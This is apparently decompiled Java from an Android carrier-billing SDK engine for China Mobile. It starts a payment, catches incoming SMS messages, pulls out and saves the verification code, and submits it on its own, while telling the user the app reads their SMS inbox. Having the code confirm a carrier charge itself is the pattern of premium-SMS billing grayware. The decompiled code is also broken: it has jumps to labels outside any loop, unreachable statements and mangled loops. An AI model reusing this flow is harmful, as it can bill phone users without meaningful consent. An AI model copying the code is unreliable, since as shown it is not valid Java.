package com.upay.billing.engine.xt_ddo;

import android.annotation.SuppressLint;
import android.content.Context;
import com.upay.billing.MtContext;
import com.upay.billing.UpayActivity;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Plan;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.io.File;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main
  extends CommonEngine
{
  private static final String TAG = "xt-ddo-main";
  private static final String Url = "$ip";
  private static final String Url_req = "orderid=$orderid&msisdn=$msisdn&serviceId=$serviceId&cpid=$cpid&spid=$spid&cpCode=$cpCode&timestamp=$timestamp&authvalue=$authvalue";
  private String cpCode = null;
  private String exec_request = null;
  private String ip = null;
  private String orderid = null;
  private String serviceId = null;
  
  public Main() {}
  
  private Long getCurrentTs()
  {
    return Long.valueOf(Util.getTs() + Util.getLong(this.core.getContext(), "Time-Diff"));
  }
  
  private boolean verifyCondition(String paramString1, String paramString2)
  {
    boolean bool = false;
    try
    {
      paramString2 = this.core.getPropString("common", paramString2, "");
      if (!Util.empty(paramString2)) {
        bool = Pattern.compile(paramString2).matcher(paramString1).find();
      }
      return bool;
    }
    catch (Exception paramString1) {}
    return false;
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    Boolean localBoolean = Boolean.valueOf(false);
    if (paramOp.equals(Op.CMCC)) {
      localBoolean = Boolean.valueOf(true);
    }
    return (localBoolean.booleanValue()) && (paramBoolean1) && (paramBoolean2);
  }
  
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Context localContext = this.core.getContext();
    String str1 = paramMtContext.trade.appKey;
    Trade localTrade = paramMtContext.trade;
    Json localJson = localTrade.getSubTrade(paramMtContext.cmd.key);
    paramMtContext.mtNum.pattern();
    switch (Main.4.$SwitchMap$com$upay$billing$engine$xt_ddo$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      if ((localJson.getInt("state") & 0x4) != 0) {
        return 524288;
      }
      Object localObject = null;
      String str2 = paramJson.getStr("msg");
      int i = paramArrayOfString.length;
      for (paramJson = localObject;; paramJson = str2.replace("$" + (i + 1), paramArrayOfString[i]))
      {
        i -= 1;
        if (i < 0) {
          break;
        }
      }
      Util.saveString(localContext, "verifycode", paramJson);
      localJson.put("state", Integer.valueOf(localJson.getInt("state") | 0x4));
      new Main.3(this, localContext, paramString1, paramJson, "", str1, paramMtContext, paramString2, localTrade).run();
      return 524288;
    case 2: 
      return 524288;
    case 3: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  @SuppressLint({"SimpleDateFormat"})
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    Util.saveString(this.core.getContext(), "verifycode", "");
    paramList = (Cmd)paramList.get(0);
    this.core.activateHandlers(paramTrade, paramTrade.id + "01", "", paramList);
    Json localJson = Json.parse(paramList.msg);
    this.ip = localJson.getStr("ip");
    this.serviceId = localJson.getStr("serviceId");
    this.cpCode = localJson.getStr("cpCode");
    this.orderid = (paramTrade.id + "01");
    new Thread(new Main.1(this, paramTrade, paramList)).start();
  }
  
  public boolean showLoading(String paramString)
  {
    Object localObject = this.core.getPropString("common", "not_show_loading", "");
    if (!Util.empty((String)localObject))
    {
      localObject = ((String)localObject).split("&");
      int i = 0;
      while (i < localObject.length)
      {
        if (paramString.equals(localObject[i])) {
          return false;
        }
        i += 1;
      }
    }
    return true;
  }
  
  public void showProgressUi(Plan paramPlan, Trade paramTrade, String paramString1, String paramString2)
  {
    if (paramPlan != null)
    {
      paramPlan = paramPlan.getLocalResourcePath(paramString1);
      if ((paramPlan == null) || (!new File(paramPlan).exists())) {
        break label63;
      }
    }
    label63:
    for (paramPlan = Util.loadLocalText(paramPlan);; paramPlan = Util.loadAssetsText(this.core.getContext(), paramString1 + ".json"))
    {
      UpayActivity.start(this.core.getContext(), paramString1, paramPlan, 0, new Main.2(this, paramTrade, paramString2));
      return;
      paramPlan = null;
      break;
    }
  }
  
  public void showUI(Plan paramPlan, Trade paramTrade, int paramInt)
  {
    String str1;
    String str2;
    if (showLoading(paramTrade.appKey))
    {
      if (paramPlan == null) {
        break label151;
      }
      str1 = paramPlan.getLocalResourcePath("upay_p_ui_n");
      if ((!verifyCondition(paramTrade.appKey, "wait_verify_app")) || (str1 == null) || (!new File(str1).exists())) {
        break label157;
      }
      str1 = "upay_p_ui_n";
      if (paramInt != 2) {
        break label235;
      }
      str1 = this.core.getPropString("zcwap", "tip_read_sms_new", "正在等待下发验证码，请稍候...");
      str2 = "upay_p_ui_n";
    }
    for (;;)
    {
      label91:
      String str3 = str1;
      switch (paramInt)
      {
      default: 
        str3 = str1;
      }
      for (;;)
      {
        UpayActivity.finish(this.core.getContext(), str2);
        showProgressUi(paramPlan, paramTrade, str2, str3);
        return;
        label151:
        str1 = null;
        break;
        label157:
        str1 = "upay_progress_ui";
        if (paramInt != 2) {
          break label235;
        }
        str1 = this.core.getPropString("zcwap", "tip_read_sms", "正在等待下发短信验证码，本应用将会访问您的短信收件箱以读取验证码.");
        str2 = "upay_progress_ui";
        break label91;
        str3 = this.core.getPropString("zcwap", "get_mobile_num", "正在获取您的手机号，请稍候...");
        continue;
        str3 = this.core.getPropString("zcwap", "tip_confirm_sms", "正在提交验证码，请稍后...");
      }
      label235:
      str2 = str1;
      str1 = null;
    }
  }
}
